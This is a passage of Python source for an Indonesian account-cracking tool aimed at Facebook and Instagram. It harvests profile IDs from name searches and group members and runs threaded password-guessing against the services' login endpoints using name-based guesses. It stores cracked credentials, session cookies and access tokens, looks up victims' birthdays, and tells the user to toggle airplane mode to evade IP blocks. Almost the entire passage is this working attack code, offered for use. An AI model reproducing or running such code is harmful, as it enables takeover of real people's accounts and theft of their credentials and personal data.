            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.mobil, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        else:
            print("\n%s [!] Isi yang benar kentod "%(M));self.langsung()
    def b_api(self, user, zona):
    	try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            header = {"user-agent": ua,
            "x-fb-connection-bandwidth": str(random.randint(20000,40000)),
            "x-fb-sim-hni": str(random.randint(20000,40000)),
            "x-fb-net-hni": str(random.randint(20000,40000)),
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "content-type": "application/x-www-form-urlencoded",
            "x-fb-http-engine": "Liger"}
            bapi = "https://b-api.facebook.com/method/auth.login"
            response = ses.get(bapi+'?format=json&email='+user+'&password='+pw+'&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
            if response.status_code != 200:
            	loop +=1
            	print ("\r\033[0;91m [!] IP terblokir. hidupkan mode pesawat 2 detik"),
                sys.stdout.flush()
                b_api(self, user, zona)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r %s*--> %s ◊ %s ◊ %s ' % (H,user,pw,response.json()['access_token'])
                ok.append('%s ◊ %s ◊ %s' % (user,pw,response.json()['access_token']))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s ◊ %s ◊ %s\n'%(user,pw,response.json()['access_token']))
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s*--> %s ◊ %s ◊ %s %s %s  ' % (K,user,pw,day,month,year)
                    cp.append("%s ◊ %s ◊ %s %s %s"% (user,pw,day,month,year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %s*--> %s ◊ %s           ' % (K,user,pw)
                cp.append('%s ◊ %s' % (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print('\r %s*--> %s/%s [OK-:%s]-[CP-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    def basic(self, user, zona):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for rom in b('input'):
            	if rom.get('value') is None:
            	    if rom.get('name') == 'email':
            	        data.update({"email":user})
                    elif rom.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({rom.get('name'): ''})
                else:
                	data.update({rom.get('name'): rom.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s*--> %s ◊ %s ◊ %s  ' % (H,user,pw,kuki)
                ok.append("%s ◊ %s ◊ %s"% (user,pw,kuki))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s\n"%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s*--> %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
                    cp.append("%s ◊ %s ◊ %s %s %s"% (user,pw,day,month,year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %s*--> %s ◊ %s            ' % (K,user,pw)
                cp.append("%s ◊ %s"% (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print('\r %s*--> %s/%s [OK-:%s]-[CP-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    def mobil(self, user, zona):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for rom in b('input'):
            	if rom.get('value') is None:
            	    if rom.get('name') == 'email':
            	        data.update({"email":user})
                    elif rom.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({rom.get('name'): ''})
                else:
                	data.update({rom.get('name'): rom.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s*--> %s ◊ %s ◊ %s ' % (H,user,pw,kuki)
                ok.append("%s ◊ %s ◊ %s"% (user,pw,kuki))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s\n"%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s*--> %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
                    cp.append("%s ◊ %s ◊ %s %s %s"% (user,pw,day,month,year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %s*--> %s ◊ %s              ' % (K,user,pw)
                cp.append("%s ◊ %s"% (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print('\r %s*--> %s/%s [OK-:%s]-[CP-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
def crack2(user, pwx):
	global looping, loping
	c_bff_ = len(pwx)
	for pas in pwx:
		if looping != 1:
			pass
		else:
			if len(status_foll) != 1:
				rm = random.choice(["\033[1;91m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[1;97m"])
				print "\r "+rm+"*--> %s/%s [OK:%s]-[CP:%s] "%(str(loping),len(mi),len(ok),len(cp)),
				sys.stdout.flush()
				c_bff_ -= 1
			else:
				pass
		try:
			if user in ok or user in cp:
				break
			pw = pas.lower()
			try:
				headerz = {"User-Agent": user_agentz_api}
				with requests.Session() as ses:
					urll = "https://www.instagram.com/"
					data = ses.get(urll, headers=headerz).content
					tokett = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
				header = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": tokett,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agentz,
						 }
				param = {"username": user,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999), pw),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}
						}
			except:
				header = {}
				param = {}
				pass
			with requests.Session() as ses:
				url = "https://www.instagram.com/accounts/login/ajax/"
				respon = ses.post(url, data=param, headers=header)
				data = json.loads(respon.content);jeda(00.1)
				# print ("\r",data)
				# print ("\r *--> %s,%s,|,%s,%s            "%(P,user,H,pw))
				if "checkpoint_url" in str(data):
					cepeh = "Checkpoint"
					ingfo(user, pw, cepeh)
					with open("cepeh.txt", "a") as simpan:
						simpan.write(" [Checkpoint] "+user+" ◊ "+pw+"\n")
					cp.append(user)
					break
				elif "userId" in str(data):
					okeh = "Berhasil"
					if len(status_foll) != 1:
						ingfo(user, pw, okeh)
						with open("okeh.txt", "a")as simpan:
							simpan.write(" [Berhasil] "+user+" ◊ "+pw+"\n")
						ok.append(user)
						#follow(ses,user)
					break
				elif "Please wait" in str(data):
					print ("\r%s[!] Mode pesawatkan 2 detik  "%(M)),
					looping+=1
					sys.stdout.flush()
					pwx = [pw]
					crack2(user, pwx)
					loping -= 1
				else:
					looping = 1
					pass
		except requests.exceptions.ConnectionError:
			print ("\r%s[!] Tidak ada koneksi Internet "%(M)),
			sys.stdout.flush()
			looping+=1
			pwx = [pw]
			crack2(user, pwx)
			loping -= 1
		except:
			looping = 1
			pass
	loping+=1
None

# DUMP PENCARIAN NAMA
def dumpfl():
    cvds = None
    cookie = None
    new = None
    if cek(1) == False:
        try:
            cookie = raw_input("\n%s%s%s \x1b[1;93mSupaya bekerja masukan cookie facebook anda\n%s# %s\x1b[1;93mCookie%s > %s"%(U,til,O,P,O,M,K))
            cvds = cvd(cookie)
            new = True
        except:
            print("\x1b[1;91m• invalid cookie");dumpfl()
    else:
        cvds = cvd(open('data/cookies').read().strip())
    r = requests.get('https://mbasic.facebook.com/profile.php', cookies=cvds, headers=hdcok()).text
    if len(bs4.re.findall('logout', r)) != 0:
        if kueh(cvds) != True:
            exit("%s%s gagal saat mendeteksi bahasa."%(M,til))
        #print("\n%s%s%s Login sebagai%s [ %s%s..]"%(U,til,O,M,H,bs4.BeautifulSoup(r,"html.parser").find("title").text[0:10]))
        if new == True:
            open('data/cookies', 'w').write(cookie)
        sim=raw_input("\n%s%s%s Nama file %s>%s "%(U,til,O,M,K)).replace(" ","_")
        print ("%s%s%s Example nama orang %s[ %sRamdhanRamadhian %s]"%(U,til,O,P,H,P))
        s=raw_input("%s%s%s Sett nama %s> %s"%(U,til,O,M,K))
        if s in("romi","Romi","ROMI","Romi Afrizal","Romi afrizal","ROMI AFRIZAL","romi afrizal"):
        	print("\n%s%s anak anjing mau crack pake nama gw "%(M,til));exit()
        elif s in("Romi Ganteng","Romi ganteng","ROMI GANTENG","romi ganteng"):
        	print ("\n%s%s memang ganteng dong abang Romi"%(H,til));exit()
        namah(sim,cvds,"https://mbasic.facebook.com/search/people/?q="+s)
    else:
        try:
            os.remove('data/cookies')
        except:
            pass
        print '\x1b[1;91m• login fail!'
        dumpfl()
    return
def namah(sim,r,b):
	open(sim,"a+")
	b=bs4.BeautifulSoup(requests.get(b, cookies=r,headers=hdcok()).text,"html.parser")
	for i in b.find_all("a",href=True):
		#os.system("clear")
		#logo()
		print("\r%s%s%s mengumpulkan id %s> %s%s \x1b[1;97m- mohon tunggu"%(U,til,O,M,H,str(len(open(sim).read().splitlines())))),;sys.stdout.flush()
		if "<img alt=" in str(i):
			if "home.php" in str(i["href"]):
				continue
			else:
				g=str(i["href"])
				if "profile.php" in g:
					name=i.find("img").get("alt").replace(", profile picture","")
					d=bs4.re.findall("/profile\.php\?id=(.*?)&",g)
					if len (d) !=0:
						pk="".join(d)
						if pk in open(sim).read():
							pass
						else:
							open(sim,"a+").write("%s<=>%s\n"%(pk,name))
				else:
					d=bs4.re.findall("/(.*?)\?",g)
					name=i.find("img").get("alt").replace(", profile picture","")
					if len(d) !=0:
						pk="".join(d)
						if pk in open(sim).read():
							pass
						else:
							open(sim,"a+").write("%s<=>%s\n"%(pk,name))
		if "Lihat Hasil Selanjutnya" in i.text:
			namah(sim,r,i["href"])
	print ('\n\n%s%s Succes dump id pencarian nama '%(H,til));print ('%s%s%s File dump tersimpan %s>%s %s '%(U,til,O,M,H,sim));raw_input('\n%s%s%s [%s Enter%s ] '%(U,til,O,U,O));menu()

# DUMP GROUP
class group:
	
	def __init__(self, cookies):
		self.glist=[]
		self.cookies=cookies
		self.manual();exit()
	def manual(self):
		print("\n%s%s%s Perlu di ingat group harus bersifat publik atau wajib join group"%(U,til,O))
		id=raw_input("%s%s%s Id groups%s > %s"%(U,til,O,M,K))
		if id in(""):
			self.manual()
		else:
			_r_=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/groups/"+id,headers=hdcok(),cookies=self.cookies).text,"html.parser")
			if "konten tidak" in _r_.find("title").text.lower():
				exit("%s%s input id grup yg valid goblok, id error, atau lu belom jooin di grup"%(M,til))
			else:
				self.listed={"id":id,"name":_r_.find("title").text}
				self.fuck_you()
				print("%s%s%s Nama grup%s > %s%s.."%(U,til,O,M,H,self.listed.get("name")[0:20]))
				self.dumps("https://mbasic.facebook.com/groups/"+id)
	def fuck_you(self):
		self.fl=raw_input('%s%s%s Nama file %s> %s'%(U,til,O,M,K)).replace(" ","_")
		if self.fl=='':self.fuck_you()
		open(self.fl,"w").close()
	def dumps(self, url):
		_r_=bs4.BeautifulSoup(requests.get(url,cookies=self.cookies,headers=hdcok()).text,"html.parser")
		print("\r%s%s%s mengumpulkan id %s> %s%s \x1b[1;97m- mohon tunggu\r"%(U,til,O,M,H,str(len(open(self.fl).read().splitlines()))))
		sys.stdout.flush();jeda(0.0050)
		for _i_ in _r_.find_all("h3"):
			try:
				if len(bs4.re.findall("\/",_i_.find("a",href=True).get("href")))==1:
					ogeh=_i_.find("a",href=True)
					if "profile.php" in ogeh.get("href"):
						_a_="".join(bs4.re.findall("profile\.php\?id=(.*?)&",ogeh.get("href")))
						if len(_a_)==0:continue
						elif _a_ in open(self.fl).read():
							continue
						else:
							open(self.fl,"a+").write("%s<=>%s\n"%(_a_,ogeh.text))
							continue
					else:
						_a_="".join(bs4.re.findall("/(.*?)\?",ogeh.get("href")))
						if len(_a_)==0:continue
						elif _a_ in open(self.fl).read():
							continue
						else:
							open(self.fl,"a+").write("%s<=>%s\n"%(_a_,ogeh.text))
			except:continue
		for _i_ in _r_.find_all("a",href=True):
			if "Lihat Postingan Lainnya" in _i_.text:
				while True:
					try:
						self.dumps("https://mbasic.facebook.com/"+_i_.get("href"))
						break
					except Exception as e:
						print("\r\x1b[1;91m•%s, retrying..."%e);continue
		print ('\n\n%s%s Succes dump id member group '%(H,til));print ('%s%s%s File dump tersimpan %s>%s %s '%(U,til,O,M,H,self.fl));raw_input('\n%s%s%s [%s Enter%s ] '%(U,til,O,U,O));menu()
def cek(arg):
	if os.path.exists("data/cookies"):
		if os.path.getsize("data/cookies") !=0:
			return True
		else:return False
	else:return False

####INFO TOOLS####
def info_tools():
    os.system('clear')
    logo()
    print ' %s\x1b[1;93m[%s\x1b[1;93m#%s\x1b[1;93m]'%(N,O,N), 52 * '\x1b[1;97m-\x1b[0m';time.sleep(0.07)
    print ' %s\x1b[1;93m[%s\x1b[1;96m>%s\x1b[1;93m] \x1b[1;92mWelcome to Tools       \x1b[1;93m'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;93m[%s\x1b[1;96m>%s\x1b[1;93m] TEAM      \x1b[1;93m: XNX-CODE TEAM 2021.'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;93m[%s\x1b[1;96m>%s\x1b[1;93m] Author    \x1b[1;93m: Sanz-Tzy \x1b[1;93mX Haris Ganz.'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;93m[%s\x1b[1;96m>%s\x1b[1;93m] Github    \x1b[1;93m: https://github.com/Sanz-Tzy'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;93m[%s\x1b[1;96m>%s\x1b[1;93m] Facebook  \x1b[1;93m: Bintang Tzy'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;93m[%s\x1b[1;96m>%s\x1b[1;93m] Link FB   \x1b[1;93m: https://www.facebook.com/bintangt.zy.92'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;93m[%s\x1b[1;96m>%s\x1b[1;93m] WhatsApp  \x1b[1;93m: +628727xxxx'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;93m[%s\x1b[1;96m>%s\x1b[1;93m] Peringatan \x1b[1;93m: Jangan lupa Follow dan Like github saya!'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;93m[%s\x1b[1;96m>%s\x1b[1;93m] Catatan  \x1b[1;93m: Kunjungi Facebook Saya Bintang Tzy'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;93m[%s\x1b[1;93m#%s\x1b[1;93m]'%(N,O,N), 52 * '\x1b[1;97m-\x1b[0m';time.sleep(0.07)
    print ' %s\x1b[1;93m[%s\x1b[1;96m>%s\x1b[1;93m] \x1b[1;92mTutorial buka akun sesi  \x1b[1;93m: '%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;93m[%s\x1b[1;96m>%s\x1b[1;93m] \x1b[1;93m: Buka akun terkena sesi'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;93m[%s\x1b[1;96m>%s\x1b[1;93m] \x1b[1;93m: lalu liat jenis sesi tersebut jika sesi tersebut ia lah komputer lain'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;93m[%s\x1b[1;96m>%s\x1b[1;93m] \x1b[1;93m: terus ketik lanjut 5-7 kli menggunakan SIM satu'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;93m[%s\x1b[1;96m>%s\x1b[1;93m] \x1b[1;93m: lalu keluar dan ubah ke sim kedua'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;93m[%s\x1b[1;96m>%s\x1b[1;93m] \x1b[1;93m: lalu mainkan mode pesawat 5-10 detik lalu masuk ke akun kesesi tersebut'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;93m[%s\x1b[1;96m>%s\x1b[1;93m] \x1b[1;93m: lihat lah perubahan tersebut'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;93m[%s\x1b[1;93m#%s\x1b[1;93m]'%(N,O,N), 52 * '\x1b[1;97m-\x1b[0m';time.sleep(0.07)
    print ' %s\x1b[1;93m[%s\x1b[1;96m>%s\x1b[1;93m] \x1b[1;93m: \x1b[1;92mTerimakasih kepada'%(N,H,N);time.sleep(0.07)
    print '\n %s\x1b[1;93m[%s\x1b[1;96m>%s\x1b[1;93m] \x1b[1;92m: Author Script'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;93m[%s\x1b[1;96m>%s\x1b[1;93m] \x1b[1;93m: Sanz-Tzy'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;93m[%s\x1b[1;96m>%s\x1b[1;93m] \x1b[1;93m: Haris Ganz'%(N,H,N);time.sleep(0.07)
    print '\n %s\x1b[1;93m[%s\x1b[1;96m>%s\x1b[1;93m] \x1b[1;92m: Team Script'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;93m[%s\x1b[1;96m>%s\x1b[1;93m] \x1b[1;93m: YumasaaTzy'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;93m[%s\x1b[1;96m>%s\x1b[1;93m] \x1b[1;93m: Mrjeeck X nano'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;93m[%s\x1b[1;96m>%s\x1b[1;93m] \x1b[1;93m: aang Ardiansyah XD'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;93m[%s\x1b[1;96m>%s\x1b[1;93m] \x1b[1;93m: Yumee Tzy'%(N,H,N);time.sleep(0.07)
    raw_input('\n [ %s\x1b[1;92mKEMBALI%s \x1b[1;93m] '%(O,N));menu()

# CEK OPSI
def file_cp():
    dirs = os.listdir('CP')
    print ("\n%s•%s [%s pilih hasil crack yg tersimpan untuk cek opsi %s]\n"%(U,O,U,O))
    for file in dirs:
        print("%s•%s> %s%s"%(U,M,K,file));jeda(0.07)
    try:
    	print("\n%s%s%s Masukan file [ cth%s: %s%s.txt%s ]"%(U,til,O,M,K,waktu,O))
        opsi()
    except NameError:
        print ('%s• file tidak ada'%(M));exit()
def opsi():
	CP = ("CP/")
	romi = raw_input("%s%s%s Nama file %s> %s"%(U,til,O,M,K))
	if romi == "":
		print("%s%s isi yang benar "%(M,til));jeda(2);opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n%s%s nama file %s tidak tersedia"%(M,til,romi))
	print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	print("%s%s%s Total akun %s: %s%s"%(U,til,O,M,P,len(file_cp)));jeda(2)
	print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split(" ◊ ")
		print("\n%s%s%s cek akun %s: %s%s"%(U,til,O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace(" *--> ",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			pass
	print("\n%s%s%s Selesai "%(U,til,O));jeda(0.07)
	raw_input("%s%s%s kembali "%(U,til,O));jeda(0.07)
	menu()
def mengecek(user, pw):
	mb = ("https://mbasic.facebook.com")
	ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36")
	ses = requests.Session()
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for _i_ in fm.find_all("input"):
		if _i_.get("name") in list:
			data.update({_i_.get("name"):_i_.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pw})
	try:
		run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	except requests.exceptions.TooManyRedirects:
		print("%s• redirect overload "%(M))
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
		run = ("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active")
		otw = ses.get(run,cookies={'cookie':kuki})
		gem = parser(otw.content,'html.parser')
		apk = gem.find('form',method='post')
		print("%s%s Berhasil ◊ %s "%(H,til,kuki));jeda(0.07)
		_no_ = 0
		for app in apk.find_all("h3"):
			data = app.find('span').text
			_no_+=1
			jalan("  %s0%s. %s%s "%(P,str(_no_),H,data))
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		sesi = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in sesi.find_all("option")]
		print("%s%s%s terdapat %s0%s%s opsi %s: "%(U,til,O,P,str(len(ngew)),O,M));jeda(0.07)
		for _o_ in range(len(ngew)):
			jalan("  %s0%s. %s%s "%(P,str(_o_+1),K,ngew[_o_]))
	elif "login_error" in str(run):
		eror = run.find("div",{"id":"login_error"}).find("div").text
		print("%s%s %s"%(M,til,eror));jeda(0.07)
	else:
		print("%s%s login gagal, silahkan cek kembali id dan password"%(M,til));jeda(0.07)
# CEK APLIKASI
def aplikasi(berhasil,kuki):
	a = []
	run = ("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active")
	otw = ses.get(run,cookies={'cookie':kuki})
	gem = parser(otw.content,'html.parser')
	apk = gem.find('form',method='post')
	_no_ = 0
	for app in apk.find_all("h3"):
		try:
			data = app.find('span').text
			_no_+=1
			a.append("  %s0%s. %s%s "%(P,str(_no_),H,data))
		except:
			pass

# GANTI USER AGENT
def useragent():
	print ("\n%s [%s01%s] \x1b[1;96mGanti user agent "%(P,K,P))
	print (" [%s02%s] \x1b[1;96mCek user agent "%(K,P))
	print (" [%s00%s] \x1b[1;91mKembali "%(M,P))
	uas()
def uas():
    u = raw_input('\n%s [?] \x1b[1;93mpilih :%s '%(P,K))
    if u == '':
        print("%s [!] \x1b[1;91mIsi yang benar kentod "%(M));jeda(2);uas()
    elif u in("1","01"):
    	print (" %s[%s*%s] \x1b[1;93mketik %s\x1b[1;96mMy user agent%s \x1b[1;93mdi browser google chrome\n [%s*%s] \x1b[1;93muntuk gunakan user agent anda sendiri"%(P,K,P,H,P,K,P))
    	print (" [%s*%s] \x1b[1;93mketik %s\x1b[1;96mdefault%s \x1b[1;93muntuk gunakan user agent bawaan tools"%(K,P,H,P))
    	try:
    	    ua = raw_input("%s [?] \x1b[1;93muser agent : %s"%(P,K))
            if ua in(""):
            	print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
